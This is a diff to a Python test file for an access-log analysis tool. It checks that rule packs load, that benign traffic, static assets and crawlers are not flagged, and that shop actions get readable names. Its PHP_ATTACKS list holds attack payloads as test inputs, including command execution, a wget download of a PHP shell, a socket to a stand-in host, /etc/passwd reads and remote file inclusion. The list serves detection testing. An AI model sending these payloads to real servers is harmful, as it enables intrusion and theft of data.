@@ -6,9 +6,11 @@ each case is a payload seen in the wild, asserted to reach the right category.
 
 from __future__ import annotations
 
+from dataclasses import replace
 from datetime import UTC, datetime, timedelta
 
 import pytest
+import yaml
 
 from logarc.core.activity import ActivityCategory
 from logarc.core.event import NormalizedEvent
@@ -53,6 +55,43 @@ def test_the_bundled_packs_load() -> None:
 
     assert len(rules) > 20
     assert DEFAULT_RULEPACK_DIR.is_dir()
+
+
+def test_every_pack_in_the_tree_contributes_rules() -> None:
+    """The packs are grouped into folders, and a folder is easy to lose.
+
+    `default_rules()` returning *something* is not enough: it returned the
+    other packs perfectly well while one whole directory went unread. This
+    counts files on disk against rules loaded, so a pack that stops being
+    reached fails here rather than quietly narrowing what the tool detects.
+    """
+    on_disk = sorted(DEFAULT_RULEPACK_DIR.rglob("*.yaml"))
+    assert on_disk, "the bundled packs are the detection layer; there must be some"
+
+    expected = 0
+    for path in on_disk:
+        pack = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
+        count = len(pack.get("rules") or [])
+        assert count, f"{path.relative_to(DEFAULT_RULEPACK_DIR)} holds no rules"
+        expected += count
+
+    assert len(default_rules()) == expected
+
+
+def test_the_packs_are_grouped_by_what_they_are_about() -> None:
+    """Attack packs and action packs are separate trees, and a technology pack
+    sits beside `global/` rather than inside it. The layout is the
+    documentation — someone adding a PHP rule should not have to ask where."""
+    names = {
+        path.relative_to(DEFAULT_RULEPACK_DIR).as_posix()
+        for path in DEFAULT_RULEPACK_DIR.rglob("*.yaml")
+    }
+
+    assert any(name.startswith("attack/") for name in names)
+    assert "attack/php.yaml" in names, "PHP rules live in one place, by technology"
+    assert any(name.startswith("attack/global/") for name in names), (
+        "and rules that presume no technology live under global/"
+    )
 
 
 def test_every_bundled_rule_has_a_unique_id() -> None:
@@ -733,3 +772,213 @@ rules:
     (labelled,) = engine.label_events([request("/honeypot")])
 
     assert labelled.label.rule_id == "house_rule"
+
+
+#: PHP shapes that reach an access log, one per rule in `attack/php.yaml`, with
+#: the evasions the CRS corpus actually uses rather than the ones a rule author
+#: would think of unprompted.
+PHP_ATTACKS: list[str] = [
+    "/p?x=<?php system('id'); ?>",
+    "/p?x=<?= $_GET[0] ?>",
+    "/p?x=<? exec('wget http://r57.biz/r57.txt'); ?>",
+    "/p?x=[php]echo 1[/php]",
+    "/p?x={php}phpinfo(){/php}",
+    "/p?x=[\\php]echo 1[/php]",
+    "/p?x=$_GET[cmd]",
+    "/p?x=$_SERVER[DOCUMENT_ROOT]",
+    "/p?x=${'_VAR'.'IABLE_NAME'}",
+    "/p?x=$ {$a}",
+    "/p?x=$$varvar",
+    # Every separator the corpus puts between a function name and its paren.
+    "/p?x=exec  (blah)",
+    "/p?x=exec\t(blah)",
+    "/p?x=exec/*comment*/()",
+    "/p?x=exec //comment\n (blah)",
+    "/p?x=exec #comment\n (blah)",
+    '/p?x=return"system"(xyz)',
+    "/p?x=@exec('test')",
+    "/p?x=call_user_func('system','id')",
+    "/p?x=array_map('system', $a)",
+    # Empty parens are a call, and the corpus scores them as attacks.
+    "/p?x=pi()",
+    "/p?x=strip_tags()",
+    "/p?x=intval(foo)",
+    "/p?x=checkdate()",
+    # Files, sockets, decoding, environment.
+    "/p?x=file_get_contents('/etc/passwd')",
+    "/p?x=fsockopen('evil.test', 4444)",
+    "/p?x=symlink()",
+    "/p?x=base64_decode('cGhwaW5mbygpOw==')",
+    "/p?x=gzinflate(base64_decode($c))",
+    "/p?x=phpinfo()",
+    "/p?x=php_uname()",
+    "/p?x=getenv()",
+    # Configuration, wrappers, inclusion, serialised objects.
+    "/p?x=allow_url_include",
+    "/p?x=memory_limit = 512M",
+    "/p?x=extension_dir=/path/to/example",
+    "/p?x=php://input",
+    "/p?x=php://filter/convert.base64-encode/resource=index.php",
+    "/p?x=expect://id",
+    "/get/plugins/spamx/BaseAdmin.class.php?_CONF[path]=https://foo.bar",
+    "/t.php?src=http://66.240.183.75/crash.php",
+    '/p?u=O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}',
+]
+
+#: And the other half. Every one of these is a CRS false-positive test: traffic
+#: a user reported one of *its* rules firing on, which it then added a case for.
+#: They are the reason the rules above are shaped the way they are, and they
+#: are far more valuable than the attack list — a miss costs a rule nobody has
+#: written, a false alarm discredits every finding the tool makes.
+PHP_BENIGN: list[str] = [
+    '/get?foo=<?xml version="1.0" encoding="UTF-8"?>',
+    '/api/orders?flux=<?xml version="1.0"?><order><id>12345</id></order>',
+    '/get?data=<?xml-stylesheet type="text/xsl" href="style.xsl"?>',
+    # PHP names functions after ordinary words, and the words come first.
+    "/get?foo=executor()",
+    "/get?foo=ecosystem()",
+    "/get?foo=systems()",
+    "/get?foo=system something()",
+    "/get?foo=the system is down()",
+    "/get?foo=cheval($foo)",
+    "/get?foo=audiofile($foo)",
+    "/get?foo=the files (yep)",
+    "/get?foo=filemtime($foo)",
+    # An open paren that never closes is a truncated string, not a call.
+    "/get?foo=exec (",
+    # A function named rather than called.
+    "/get?foo=eval",
+    "/post/?test=Moreover, phpinfo can leak sensitive configuration details.",
+    "/is_int?a=1",
+    # Letters that happen to spell a function name inside a longer word.
+    "/post/?test=PaintValdosta",
+    "/post/?test=SprintForTheCause",
+    "/get?foo=RootAndLeafOpenCamera.jpg",
+    "/post/?test=A loaded ghost gun (unserialized) was recovered in the car.",
+    "/get?foo=autodescription-site-settings[title_strip_tags]",
+    # Brackets and parens in prose, which the `[php]` tag rule must not claim.
+    "/get?x=[ACME]: this is, (another) test (foo)bar or foo(bar).",
+    "/get?x=(foo)bar or foo(bar) or [foo]bar or foo[bar]",
+    '/get?search=this is a "dog" (not a cat)',
+    # A URL in a parameter is a redirect, an OAuth callback or a share link far
+    # more often than it is remote file inclusion, and one log line cannot tell
+    # them apart. Claiming otherwise fires constantly on ordinary traffic.
+    "/page?url=https://example.com",
+    "/www/delivery/lg.php?bannerid=18&zoneid=4&loc=https%3A%2F%2Fwww.example.com%2Ff",
+    # An ERB tag that prints one value is what an output tag is for.
+    "/get?x=<%=title%>",
+]
+
+
+@pytest.mark.parametrize("target", PHP_ATTACKS)
+def test_php_payloads_are_caught(engine: RuleEngine, target: str) -> None:
+    (labelled,) = engine.label_events([request(target)])
+
+    assert labelled.all_labels, f"nothing matched {target!r}"
+    assert any(label.category.is_hostile for label in labelled.all_labels)
+
+
+@pytest.mark.parametrize("target", PHP_BENIGN)
+def test_traffic_certified_harmless_stays_quiet(engine: RuleEngine, target: str) -> None:
+    """The half of the corpus that is easy to forget, and expensive to fail.
+
+    A rule pack reaches any recall it likes by matching everything. What stops
+    that being a good score is being counted when it fires on traffic somebody
+    else has already certified as harmless — so these are pinned individually,
+    and a regression names the exact request rather than moving a percentage.
+    """
+    (labelled,) = engine.label_events([request(target)])
+
+    fired = [label.rule_id for label in labelled.all_labels if label.category.is_hostile]
+    assert not fired, f"{target!r} was claimed by {fired}"
+
+
+#: Real paths from the shopfront excerpt's asset bundle, chosen because each
+#: one contains a word an action rule is interested in.
+STATIC_ASSETS: list[str] = [
+    "/assets/js/autocomplete.js",
+    "/assets/js/cart.js",
+    "/assets/js/search.js",
+    "/assets/js/checkout.js",
+    "/assets/css/account.css",
+    "/assets/css/layout.css",
+    "/assets/img/logo.png",
+    "/assets/fonts/inter-400.woff2",
+    "/assets/js/app.js?q=1",
+    "/assets/css/site.css?v=8",
+]
+
+
+@pytest.mark.parametrize("target", STATIC_ASSETS)
+def test_an_action_rule_never_claims_a_static_asset(engine: RuleEngine, target: str) -> None:
+    """The bug this guards against cost 1.2 points of accuracy once.
+
+    Action rules run before the fallback that recognises static assets, so an
+    unanchored pattern takes the asset with it: `/(search|autocomplete)$` was
+    written to catch `/api/autocomplete` and caught `/assets/js/autocomplete.js`
+    on 38 requests instead. The bundle of a shop is named after the shop's
+    features, so every word an action rule looks for is also a filename there.
+    """
+    (labelled,) = engine.label_events([request(target)])
+
+    assert labelled.label.category is ActivityCategory.STATIC_ASSET, (
+        f"{target!r} was claimed by {[item.rule_id for item in labelled.all_labels]}"
+    )
+
+
+def test_an_action_rule_never_claims_a_crawler(engine: RuleEngine) -> None:
+    """A bot fetching `/cart` is a bot. The fallback's crawler branch answers
+    *who*, runs before everything else it knows, and must keep doing so once
+    rules describe *what* — on this corpus 767 of 814 product-page requests are
+    one crawler working through the catalogue."""
+    for target in ("/cart", "/checkout", "/search?q=oak", "/account", "/p/67"):
+        (labelled,) = engine.label_events([request(target, user_agent="Googlebot/2.1")])
+
+        assert labelled.label.category is ActivityCategory.CRAWLING, (
+            f"{target!r} was claimed by {[item.rule_id for item in labelled.all_labels]}"
+        )
+
+
+@pytest.mark.parametrize(
+    ("target", "method", "expected_name", "expected_category"),
+    [
+        ("/cart", "GET", "View Cart", ActivityCategory.BROWSING),
+        ("/api/cart/add", "POST", "Modify Cart", ActivityCategory.API_CALL),
+        ("/checkout", "POST", "Checkout", ActivityCategory.BROWSING),
+        ("/payment/stripe", "GET", "Payment", ActivityCategory.API_CALL),
+        ("/account/orders", "GET", "Order History", ActivityCategory.BROWSING),
+        ("/track/12345", "GET", "Order Tracking", ActivityCategory.BROWSING),
+        ("/search?q=oak", "GET", "Search", ActivityCategory.BROWSING),
+        # A search reached as a call, not a page. Two rules match this and the
+        # category is the whole difference between them, so asserting the name
+        # alone passed while all six of the corpus's requests to it were
+        # labelled `browsing`.
+        ("/api/autocomplete?q=oa", "GET", "Search", ActivityCategory.API_CALL),
+        ("/login", "POST", "Sign In", ActivityCategory.AUTHENTICATION),
+        ("/account/password/reset", "POST", "Password Reset", ActivityCategory.AUTHENTICATION),
+        ("/upload", "POST", "File Upload", ActivityCategory.API_CALL),
+        ("/api/stock?id=3", "GET", "Stock Check", ActivityCategory.API_CALL),
+        ("/contact", "POST", "Form Submission", ActivityCategory.API_CALL),
+    ],
+)
+def test_an_action_is_named_by_what_it_was(
+    engine: RuleEngine,
+    target: str,
+    method: str,
+    expected_name: str,
+    expected_category: ActivityCategory,
+) -> None:
+    """The point of the whole `action/` tree.
+
+    `POST /checkout` used to be described as "Non-idempotent Request", which
+    names the HTTP verb and tells a reader nothing. These names are what makes
+    "which of these addresses was a customer?" a question the report answers.
+    """
+    event = request(target)
+    (labelled,) = engine.label_events([replace(event, method=method)])
+
+    assert labelled.label.name == expected_name, (
+        f"{method} {target} was called {labelled.label.name!r}"
+    )
+    assert labelled.label.category is expected_category
+    assert not labelled.label.category.is_hostile
